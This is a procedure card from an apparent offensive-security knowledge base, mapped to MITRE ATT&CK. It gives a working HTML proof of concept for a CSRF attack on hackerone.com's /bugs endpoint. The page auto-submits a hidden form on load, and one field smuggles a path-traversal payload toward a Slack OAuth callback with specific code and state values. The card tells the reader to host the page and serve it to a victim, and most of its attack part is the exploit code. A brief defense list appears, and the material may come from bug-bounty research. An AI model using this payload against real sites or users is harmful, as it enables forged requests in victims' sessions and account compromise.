---
id: proc-006
tags:
  - poc
  - csrf
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/html-csrf-poc]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:30.191Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-HTML-POC-for-CSRF-Attack

## Summary

This procedure creates an HTML proof-of-concept that auto-submits a form to the /bugs endpoint with the malicious report_id, simulating a CSRF attack deliverable via phishing or malicious site.

## Description

The PoC uses an onload script to submit a GET form to /bugs with the traversal payload, tricking the victim's browser into making the request in their session context. This bypasses CSRF protections on the targeted endpoints, focusing on web-based delivery.

## Requirements

1. HTML file editor
2. Valid payload from prior steps
3. Victim must visit the PoC page while logged into HackerOne

## Defense

Defensive measures and detection strategies:

- Educate users on phishing and unexpected form submissions
- Implement SameSite cookies for session tokens
- Monitor for anomalous /bugs requests with traversal

## Objectives

1. Automate malicious request submission
2. Demonstrate real-world CSRF delivery
3. Validate full chain exploitability

## Instructions

### Step 1: Build HTML Form

**Context**: Create hidden form with all params, auto-submit on load.

**Command** ([[commands/html-csrf-poc]]):
```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
<form action="https://hackerone.com/bugs" method="GET">
<input type="hidden" name="subject" value="anontest5667">
<input type="hidden" name="report_id" value="../../../auth/slack/callback?code=14582397537.14583819952.b7ff4c7e48&state=9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55&asd=">
<input type="hidden" name="view" value="new">
<input type="hidden" name="substates[]" value="new">
<input type="hidden" name="text_query" value="">
<input type="hidden" name="sort_type" value="latest_activity">
<input type="hidden" name="sort_direction" value="descending">
<input type="hidden" name="limit" value="25">
<input type="hidden" name="page" value="1">
</form>
</body>
</html>
```

> Save as .html and host/serve to victim. Expected: Auto-submit triggers the exploit.

### Step 2: Test PoC

**Context**: Load in browser with session to verify submission.

**Command** (Open file):
```bash
# Open in browser: file:///path/to/poc.html
```

> Success if request fires and callback processes.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used

- [[commands/html-csrf-poc]]

## Tools Used


## Tags

- poc
- csrf
- html
